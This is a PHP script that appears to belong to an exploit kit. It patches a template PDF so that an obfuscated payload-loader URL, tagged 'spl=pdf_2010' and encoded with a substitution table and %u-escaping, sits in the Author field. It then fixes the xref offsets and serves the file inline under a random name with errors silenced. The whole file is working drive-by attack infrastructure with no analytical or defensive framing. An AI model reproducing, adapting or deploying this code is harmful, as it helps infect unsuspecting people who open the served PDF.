<?php 

error_reporting(0);
include_once (dirname(__FILE__) . "/config.php");


define('ENCODE_SRC_TABLE', "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890/.:_-?&=%");
define('ENCODE_DST_TABLE', "xa83V5OJ&Enl0Hpq-tNybkeYZ%cSAMTj7KFXBoI_rC6DL=0hwGdfu4Rvg:1zQsmiP2/9?W.U");


$pdf = file_get_contents(dirname(__FILE__) . "/nem2378pdf");
$url = $load . "?spl=pdf_2010";

$encoded_url = build_encoded_url($url);
$src_url = "";


$pdf = preg_replace_callback("/(\/\s*Author\s*)\((.*)\)/", "patch_url_block", $pdf);
$pdf = preg_replace_callback("/(\r?\n)+startxref(\r?\n)+(\d+)(\r?\n)+%%EOF/i", "patch_size", $pdf);
$pdf = preg_replace_callback("/(\r?\n)+(\d{10,10}) 00000 n(\s*\r?\n)+(\d{10,10}) 00000 n(\s*\r?\n)+trailer/i", "patch_xref", $pdf);



header("Accept-Ranges: bytes\r\n");
header("Content-Length: ".strlen($pdf)."\r\n");
header("Content-Disposition: inline; filename=".substr(md5(microtime()),0,5)."d.pdf");
header("\r\n");
header("Content-Type: application/pdf\r\n\r\n");

die($pdf);





///
function patch_xref($m)
{  
	global $encoded_url, $src_url;

	$newsize = strlen($encoded_url) - strlen($src_url);

	$length = intval($m[2]);

	$length2 = intval($m[4]);
	$length2 += $newsize;

	$s = $m[1];
	$s.= sprintf("%010d 00000 n" . $m[3], $length);
	$s.= sprintf("%010d 00000 n" . $m[5], $length2);
	$s.= "trailer";

	return $s;
}


function patch_url_block($m)
{
	global $encoded_url, $src_url;

	$src_url = $m[2];
	return $m[1] . "(" . $encoded_url . ")";
}  



///
function patch_size($m)
{  
	global $encoded_url, $src_url;

	$length = intval($m[3]);
	$length += strlen($encoded_url) - strlen($src_url);

	$s = $m[1]."startxref" . $m[2];
	$s.= sprintf("%d" . $m[4], $length);
	$s.= sprintf('%%%%EOF', $length2);

	return $s;
}



///
function build_encoded_url($url, $len = 255)
{
	$url = unescape($url);
 	return encode_str($url, ENCODE_SRC_TABLE, ENCODE_DST_TABLE);
}

///
function encode_str($str, $src_table, $dest_table)
{
	$ret = "";
	for($i=0; $i < strlen($str); $i++)
	{
		$index = strpos($src_table, $str[$i]);
		if($index > -1)
			$ret.= $dest_table[$index];
	}

	return $ret;
}



function unescape($s)
{
	$out = "";
    $res=strtoupper(bin2hex($s));
    $g = round(strlen($res)/4);
    if ($g != (strlen($res)/4)) $res.="00";
    for ($i=0; $i<strlen($res);$i+=4)
    	$out.="%u".substr($res,$i+2,2).substr($res,$i,2);
    return $out;
}
